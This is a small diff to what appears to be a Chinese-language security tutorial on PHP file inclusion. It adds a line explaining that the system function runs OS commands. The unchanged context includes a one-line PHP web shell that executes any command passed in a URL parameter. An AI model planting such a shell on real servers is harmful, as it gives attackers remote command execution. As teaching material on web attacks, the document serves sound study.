@@ -569,7 +569,9 @@ inclide($modname);
 ```php
 <? system($_GET['cmd'])?>
 ```
-```
+system命令是执行OS命令
+
+##10.8 
 
 
 
